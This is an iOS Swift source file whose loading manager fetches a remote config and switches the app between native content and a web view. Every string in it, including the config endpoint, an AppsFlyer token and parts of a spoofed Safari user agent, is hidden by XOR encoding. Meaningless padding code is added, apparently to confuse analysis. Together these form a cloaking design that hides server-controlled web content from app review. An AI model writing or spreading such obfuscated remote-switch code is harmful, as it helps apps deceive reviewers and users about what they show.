//
//  LoadingManager.swift
//  1TrulbargrovarStrinel
//
//  Загрузочный менеджер: при старте показывает LoadingViewController, который запрашивает конфиг
//  и затем переключает на ContentView или WebviewVC в зависимости от ответа сервера.
//

import Foundation
import SwiftUI
import UIKit

// MARK: - Startup entropy (dead code layout)

enum LoadingEntropyModule {
    static func runStartupJitterBaseline() {
        _LmEntropyRelay.accumulateBaseline()
    }
}

private enum _LmEntropyRelay {
    private static var _sink: UInt64 = 0x9E37_79B9_7F4A_7C15

    @inline(never)
    static func accumulateBaseline() {
        var acc = _sink
        acc = acc &+ _t0(acc)
        acc = acc &+ _t1(~acc)
        acc = acc &+ _t2(UInt32(truncatingIfNeeded: acc))
        acc = acc &+ _t3(acc)
        acc ^= _unusedBranchMatrix()
        _sink = acc
    }

    @inline(never)
    private static func _t0(_ x: UInt64) -> UInt64 {
        ((x &* 0x5851_F42D_4C95_7F17) &>> 33) ^ (x &<< 11)
    }

    @inline(never)
    private static func _t1(_ x: UInt64) -> UInt64 {
        x ^ (x &>> 19) ^ (x &<< 23)
    }

    @inline(never)
    private static func _t2(_ x: UInt32) -> UInt64 {
        UInt64(x.byteSwapped ^ 0xA5A5_A5A5) | (UInt64(x &* 0x9E37) &<< 32)
    }

    @inline(never)
    private static func _t3(_ x: UInt64) -> UInt64 {
        var v = x
        for i in 0 ..< 7 {
            v = v &+ UInt64(i &* 13) ^ (v &>> UInt64(i % 5 + 1))
        }
        return v &* 0xD6E8_FE70_7B3A_E5C1
    }

    @inline(never)
    private static func _unusedBranchMatrix() -> UInt64 {
        let q: [(UInt64, UInt64)] = [
            (3, 11), (7, 29), (13, 41), (17, 59), (23, 67),
            (31, 73), (37, 83), (43, 97), (47, 101), (53, 107),
        ]
        return q.reduce(into: 1 as UInt64) { acc, pair in
            acc = acc &+ (pair.0 &* pair.1) ^ (pair.0 &+ pair.1)
        }
    }
}

// MARK: - XOR string payloads (module-wide access)

private enum _Q4mK7R3v {
    private static let _k: [UInt8] = [0x5A, 0xC3, 0x91, 0x2F, 0x6E, 0x88, 0x31, 0xBC]

    static func _u8(_ enc: [UInt8]) -> String {
        var out = [UInt8]()
        out.reserveCapacity(enc.count)
        let k = _k
        for i in enc.indices {
            out.append(enc[i] ^ k[i % k.count])
        }
        return String(bytes: out, encoding: .utf8) ?? ""
    }
}

private enum _Z9wN2pPayload {
    static let _configURL: [UInt8] = [50, 183, 229, 95, 29, 178, 30, 147, 49, 166, 233, 66, 11, 240, 82, 206, 63, 164, 227, 74, 22, 248, 67, 217, 54, 175, 248, 67, 64, 235, 94, 209, 117, 160, 254, 65, 8, 225, 86, 146, 42, 171, 225]
    static let _storeId: [UInt8] = [51, 167, 167, 24, 88, 186, 1, 139, 98, 250, 162, 26]
    static let _post: [UInt8] = [10, 140, 194, 123]
    static let _contentType: [UInt8] = [25, 172, 255, 91, 11, 230, 69, 145, 14, 186, 225, 74]
    static let _applicationJson: [UInt8] = [59, 179, 225, 67, 7, 235, 80, 200, 51, 172, 255, 0, 4, 251, 94, 210]
    static let _notifName: [UInt8] = [59, 179, 225, 92, 40, 228, 72, 217, 40, 128, 254, 65, 24, 237, 67, 207, 51, 172, 255, 107, 15, 252, 80, 238, 63, 162, 245, 86]
    static let _ua1: [UInt8] = [23, 172, 235, 70, 2, 228, 80, 147, 111, 237, 161, 15, 70]
    static let _ua2: [UInt8] = [97, 227]
    static let _ua3: [UInt8] = [122, 175, 248, 68, 11, 168, 124, 221, 57, 227, 222, 124, 78, 208, 24]
    static let _ua4: [UInt8] = [27, 179, 225, 67, 11, 223, 84, 222, 17, 170, 229, 0, 88, 184, 4, 146, 107, 237, 160, 26, 78, 160, 122, 244, 14, 142, 221, 3, 78, 228, 88, 215, 63, 227, 214, 74, 13, 227, 94, 149]
    static let _ua5: [UInt8] = [12, 166, 227, 92, 7, 231, 95, 147]
    static let _ua6: [UInt8] = [9, 162, 247, 78, 28, 225, 30, 138, 106, 247, 191, 30]
    static let _ua_cpu_ipad: [UInt8] = [25, 147, 196, 15, 33, 219, 17]
    static let _ua_cpu_iphone: [UInt8] = [25, 147, 196, 15, 7, 216, 89, 211, 52, 166, 177, 96, 61, 168]
    static let _ua_ipod: [UInt8] = [51, 147, 254, 75, 78, 252, 94, 201, 57, 171]
    static let _ua_ipad: [UInt8] = [51, 147, 240, 75]
    static let _ua_iphone: [UInt8] = [51, 147, 249, 64, 0, 237]
    static let _lastUrl: [UInt8] = [22, 162, 226, 91, 59, 250, 93]
    static let _timeKey: [UInt8] = [14, 170, 252, 74]
    static let _okBtn: [UInt8] = [21, 136]
    static let _netQueue: [UInt8] = [52, 166, 229, 88, 1, 250, 90, 146, 59, 181, 240, 70, 2, 233, 83, 213, 54, 170, 229, 86, 64, 235, 89, 217, 57, 168]
}

enum LoadingScrambledLine {
    static var configEndpointURLString: String { _Q4mK7R3v._u8(_Z9wN2pPayload._configURL) }
    static var appStoreListingId: String { _Q4mK7R3v._u8(_Z9wN2pPayload._storeId) }
    static var httpPostVerb: String { _Q4mK7R3v._u8(_Z9wN2pPayload._post) }
    static var headerFieldContentType: String { _Q4mK7R3v._u8(_Z9wN2pPayload._contentType) }
    static var mimeApplicationJSON: String { _Q4mK7R3v._u8(_Z9wN2pPayload._applicationJson) }
    static var appsFlyerPipelineReadyToken: String { _Q4mK7R3v._u8(_Z9wN2pPayload._notifName) }

    static var uaMozillaPrefix: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua1) }
    static var uaSemicolonSpacer: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua2) }
    static var uaLikeMacOSXSuffix: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua3) }
    static var uaAppleWebKitChunk: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua4) }
    static var uaVersionPrefix: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua5) }
    static var uaSafariTail: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua6) }
    static var uaCpuOSPrefixIPad: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua_cpu_ipad) }
    static var uaCpuOSPrefixIPhone: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua_cpu_iphone) }
    static var uaPlatformIPod: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua_ipod) }
    static var uaPlatformIPad: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua_ipad) }
    static var uaPlatformIPhone: String { _Q4mK7R3v._u8(_Z9wN2pPayload._ua_iphone) }

    static var webViewDefaultsLastURLKey: String { _Q4mK7R3v._u8(_Z9wN2pPayload._lastUrl) }
    static var webViewDefaultsTimeKey: String { _Q4mK7R3v._u8(_Z9wN2pPayload._timeKey) }
    static var alertAcknowledgeTitle: String { _Q4mK7R3v._u8(_Z9wN2pPayload._okBtn) }
    static var networkPathQueueLabel: String { _Q4mK7R3v._u8(_Z9wN2pPayload._netQueue) }
}

// MARK: - LoadingManager

/// Менеджер выбора стартового экрана при запуске приложения.
final class LoadingManager {

    static let shared = LoadingManager()

    private init() {}

    /// Возвращает корневой контроллер: экран загрузки, который запрашивает конфиг и затем
    /// переходит на ContentView или WebviewVC (с сохранённой или новой ссылкой).
    func makeRootViewController() -> UIViewController {
        LoadingEntropyModule.runStartupJitterBaseline()
        return LoadingViewController()
    }
}
